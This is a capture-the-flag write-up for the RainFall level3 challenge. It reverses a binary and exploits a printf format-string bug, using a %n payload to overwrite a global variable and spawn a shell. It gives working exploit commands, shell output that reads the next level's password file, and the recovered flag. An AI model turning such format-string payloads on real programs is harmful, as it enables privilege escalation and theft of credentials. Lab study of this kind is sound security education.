
### notes
```c
0x804988c  m : global variable m
0x80484a4  v : function : called in main
0x804851a  main : function 
0x8048526  main return address
0x8048519  main return address
```

### 0x804851a : main() : disassembly
simply call the the v function and nothing else
```c
0x0804851a <+0>:	push   ebp
0x0804851b <+1>:	mov    ebp,esp
0x0804851d <+3>:	and    esp,0xfffffff0
0x08048520 <+6>:	call   0x80484a4 <v>
0x08048525 <+11>:	leave  
0x08048526 <+12>:	ret    
```
### 0x80484a4 : v() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    char *buffer1[512] = ebp-530
 
    // 0x218 ... 536
    // 0x208 ... 530
    // 0x200 ... 512
    // 0x40  ... 64
    // 0xc   ... 12

}
```
* __`<0> -> <+3> : prepare stack frame for n function with size 536`__
```c
0x080484a4 <+0>:	push   ebp
0x080484a5 <+1>:	mov    ebp,esp
0x080484a7 <+3>:	sub    esp,536
```
* __`<+9> -> <+35> : call fill the buffer with 512 characters from the user input with fgets() which is protected from the bufferoverflow unlik gets()`__
```c
0x080484ad <+9>:	mov    eax,ds:0x8049860 // stdin
0x080484b2 <+14>:	mov    DWORD PTR [esp+8],eax
0x080484b6 <+18>:	mov    DWORD PTR [esp+4],512
0x080484be <+26>:	lea    eax,[buffer1]
0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt> // fgets(buffer, 512, stdin)
```
* __`<+40> -> <+49> : call printf with the buffer1 as input`__
```c
0x080484cc <+40>:	lea    eax,[buffer1]
0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
0x080484d5 <+49>:	call   0x8048390 <printf@plt> // printf(buffer1)
```
* __`<+54> -> <+62> : if (m != 64) { return }`__
```c
0x080484da <+54>:	mov    eax,ds:0x804988c // m variable
0x080484df <+59>:	cmp    eax,64
0x080484e2 <+62>:	jne    0x8048518 <v+116>
```
* __`<+64> -> <+99> : print "Wait what?!\n" to the screen with fwrite`__
```c
0x080484e4 <+64>:	mov    eax,ds:0x8049880 // stdout
0x080484e9 <+69>:	mov    edx,eax
0x080484eb <+71>:	mov    eax,0x8048600 // "Wait what?!\n"
0x080484f0 <+76>:	mov    DWORD PTR [esp+12],edx
0x080484f4 <+80>:	mov    DWORD PTR [esp+8],12
0x080484fc <+88>:	mov    DWORD PTR [esp+4],1
0x08048504 <+96>:	mov    DWORD PTR [esp],eax
0x08048507 <+99>:	call   0x80483b0 <fwrite@plt> // fwrite("Wait what?!\n", 1, 12, stdout)
```
* __`<+104> -> <+111> : execute the shell with system function`__
```c
0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d // "/bin/sh"
0x08048513 <+111>:	call   0x80483c0 <system@plt> // system("/bin/sh")
```
* __`<+116> -> <+117> : pop the stack frame of the v function and go back to main`__
```c
0x08048518 <+116>:	leave  
0x08048519 <+117>:	ret  
```
 

### Code Prediction 
```c
int m = 0;

void v() {
    const *buffer[512]

    fgets(buffer, 512, stdin);
    printf(bufffer);

    if (m == 64) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }

    return 
}

int main(int argc(ebp+0x8), char **argv(ebp+12)) {
    v()
    return;
    
}

```
### Stack Illustration
```c
+high memory address 0xffffffff

+-------------------+ 
[                   ]
+-------------------+ 
[                   ]
+-------------------+ <-----------+
[      OLD_EIP      ]             |
+-------------------+             |
[      OLD_EBP      ]             |
+-------------------+             |
[and esp,0xfffffff0 ]             | MAIN STACK FRAME
+-------------------+             |
[     MAIN_EIP      ]             |
+-------------------+             |
[     MAIN_EBP      ]             |
+-------------------+ <-----------+ <------------------------------------+
+                   + 532         |                                      |
+                   +             |                                      | 
+                   +             |                                      |
+                   +             |                                      |
+                   +             |                                      |
+       buffer      +             |                                      |
+                   +             |                                      |
+                   +             | V STACK FRAME (526 bytes allocated)  |
+                   +             |                                      | Buffer1 area (512)
+                   +             |                                      |
+-------------------+ 24          |                                      |
+                   + 20          |                                      |
+                   + 16          |                                      |
+                   + 12          |                                      |
+                   + 8           |                                      |
+                   + 4           |                                      |
+-------------------+ <---ESP-----+ <------------------------------------+

-low memory address 0x00000000
```

### Process of the Exploit
as we read from the code extracted, we resume :
1. there is a global variable called __m (0x804988c)__ and a function __v__ called in __main__
1. the programm takes 512 from the the user input with fgets (which is not open for buffer overflow attack like gets()) and fill the content to BUFFER[512]
1. printf(BUFFER)
1. verify if m == 64 to execute shell from the shell then exit the program

* the idea here is to overwrite the m value in order to get the shell,we cant use the buffer overflow to inject a shell code for example, since the fgets is protected againt it, 
but we have a printf with a  buffer taken directly from the user wihtout any check, printf has string format that can be used as an attack, which is __%n__ you can read about it (check the ressources)
lets start the process:


- as u can see in this simple input to print address in the memory
```shell
level3@RainFall:~$ (python -c 'print "%p . " * 10'; cat - ) | ./level3 
0x200 . 0xb7fd1ac0 . 0xb7ff37d0 . 0x2e207025 . 0x20702520 . 0x7025202e . 0x25202e20 . 0x202e2070 . 0x2e207025 . 0x20702520 . 
```
- lets add our desired address (__m (0x804988c)__),
you can notice that our address is placed as the fourth address in the output 
```shell
level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%p . " * 8'; cat - ) | ./level3 
�0x200 . 0xb7fd1ac0 . 0xb7ff37d0 . 0x804988c . 0x2e207025 . 0x20702520 . 0x7025202e . 0x25202e20 . 
```

- its time to use the print format exploit
- `%x$n` : if we give this format to printf , it will write N bytes read before it into to address in the X position 
- e.g : `printf ("ABCD" + "%3$n")` => total bytes read before is `4 (ABCD)` , so it will load the address at the index 3 with 4
- imagine this address is `0x49035123` , its value will be `4`
final payload is :
```c
MI = m address in little endian
NF = %4$n format (since we know that the index if our address in placed in the 4th place)
PADDING = 60 character
```
__you may ask why just 60 bytes and the program is comparing with 64 ?__
simple becuz as we said %n calculate total of all what has been read before 
so the MI size will be 4
and the PADDING will be 60
so total is 64
`printf(MI + PADDING + NF )`
```shell

level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "." * 60 + "%4$n"'; cat - ) | ./level3 
�............................................................
Wait what?!
whoami
level4
```
we got it,
debug it in gdb to learn more

---
### Solution :
#### Solution 1:

```shell
level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "." * 60 + "%4$n"'; cat - ) | ./level3 
�............................................................
Wait what?!
whoami
level4
pwd
/home/user/level3
cd /home/user/level4 
ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
#### Solution 2:
using the space padding format in prinf __%Xd__
```shell
level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d" + "%4$n"'; cat) | ./level3
�                                                         512
Wait what?!
whoami
level4
pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

```
__`flag : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`__

---
### Ressources :
* [Exploit 101 - Format Strings ](https://axcheron.github.io/exploit-101-format-strings/)
* [%n printf](https://www.geeksforgeeks.org/g-fact-31/)
* [Exploit format String vulnerability in printf()](https://medium.com/@gurdeeps158/exploit-format-string-vulnerability-in-printf-6740d9ff057e)
* [Exploiting Printf Vulnerability in C - StackOverflow](https://stackoverflow.com/questions/46776664/exploiting-printf-vulnerability-in-c)
